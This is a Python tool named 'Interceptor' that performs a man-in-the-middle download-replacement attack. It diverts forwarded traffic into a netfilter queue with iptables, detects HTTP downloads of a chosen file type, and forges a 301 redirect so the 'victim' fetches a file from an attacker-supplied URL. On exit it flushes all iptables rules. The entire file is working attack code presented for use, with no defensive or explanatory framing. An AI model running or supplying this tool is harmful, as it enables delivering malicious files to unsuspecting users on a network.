import netfilterqueue
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)      # Silent scapy
import scapy.all as scapy
from colorama import Fore , Style
import os
import random

#       MANIPULATING IPTABLES
def manipulating_iptables():
    # os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 123")    # for running attack on your local machine uncomment both line
    # os.system("iptables -I INPUT -j NFQUEUE --queue-num 123")     # for running attack on your local machine uncomment both line
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 123")
    print("[*] IP tables modified successfully...")
#       -----------------------------------------------------


def random_banner():
    banner_id = random.randint(1, 3)
    color_1 = Fore.LIGHTRED_EX + Style.BRIGHT
    color_2 = Fore.BLUE + Style.BRIGHT
    color_3 = Fore.YELLOW + Style.BRIGHT
    if banner_id == 1:
        return color_1
    elif banner_id == 2:
        return color_2
    else:
        return color_3

def banner(color):
    print(color + """    
 _____                                                       
(_____)      _                               _               
   _   ____ | |_  ____  ____ ____ ____ ____ | |_  ___   ____ 
  | | |  _ \|  _)/ _  )/ ___) ___) _  )  _ \|  _)/ _ \ / ___)
 _| |_| | | | |_( (/ /| |  ( (__( (/ /| | | | |_| |_| | |    
(_____)_| |_|\___)____)_|   \____)____) ||_/ \___)___/|_|    
                                      |_|                                                         
    """ + Fore.WHITE + Style.BRIGHT + "By arslan..!\n")
    print("-----------------------------------------------------")

# Global Variables  ----------
file_extension = ""
modified_file_path = ""
ack_number = 0
#   ---------------------------

# Verifying arguments interactively
def shell_args():
    global file_extension
    global modified_file_path
    print(Fore.CYAN + Style.BRIGHT + "[~]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " Please Enter file extension to intercept")
    print(Fore.CYAN + Style.BRIGHT + "[~]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " e.g ('exe', 'mp4', 'mp3', 'jpg' etc... ) ")
    while not file_extension:
        file_extension = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[?] " + Fore.LIGHTWHITE_EX + Style.BRIGHT + "")
    print(Fore.CYAN + Style.BRIGHT + "[~]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " Please Enter modified file download link (URL)")
    print(Fore.CYAN + Style.BRIGHT + "[~]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " e.g ('https://www.ExampleDownloadLink.com') ")
    while not modified_file_path:
        modified_file_path = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[?] " + Fore.LIGHTWHITE_EX + Style.BRIGHT + "")


# CALLBACK FUNCTION FOR NFQUEUE ------------------------------------------
def capture_packet(packet):
    global file_extension
    global modified_file_path
    global ack_number
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:   # raise Attribute error on interruption in connection or Browser is closed
            if scapy_packet[1].dport == 80:     #checking if packet has layer HTTP
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[*]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " HTTP request packet")
                if bytes(".{}".format(file_extension), encoding='utf-8') in scapy_packet[scapy.Raw].load:         #checking if there is file download in packet
                    print(Fore.LIGHTBLUE_EX + Style.BRIGHT + "[+]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " File Intercepted")
                    ack_number += scapy_packet[1].ack            #Tracking ack number to identify packet

            elif scapy_packet[1].sport == 80:       #checking if packet has layer HTTP
                if scapy_packet[1].seq == ack_number:
                    scapy_packet[2].load = "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(modified_file_path)
                    del scapy_packet[scapy.IP].chksum  # avoiding chksum error for IP Layer
                    del scapy_packet[scapy.IP].len  # avoiding len error for IP Layer
                    del scapy_packet[scapy.TCP].chksum  # avoiding chksum error for UDP Layer
                    ack_number = 0      #resetting ack_number
                    packet.set_payload(bytes(scapy_packet))
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[+]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " File Replaced successfully ...!")
        except AttributeError:
            print(Fore.RED + Style.BRIGHT + "[-] Victim Connection Interrupted or Browser Closed")
        pass
    packet.accept()
    #-------------------------------------------------------------------------------------------------------------


# main -------------------------------------------
try:
    banner(random_banner())
    manipulating_iptables()
    shell_args()
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[*]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " Starting Core process ...")
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[*]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " Interceptor Started")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(123, capture_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    print(Fore.WHITE + Style.BRIGHT + "\n [+] Successfully restore iptables")
    print(Fore.LIGHTRED_EX + Style.BRIGHT + "\n [-] Exiting")
    exit(0)
    #   --------------------------------------------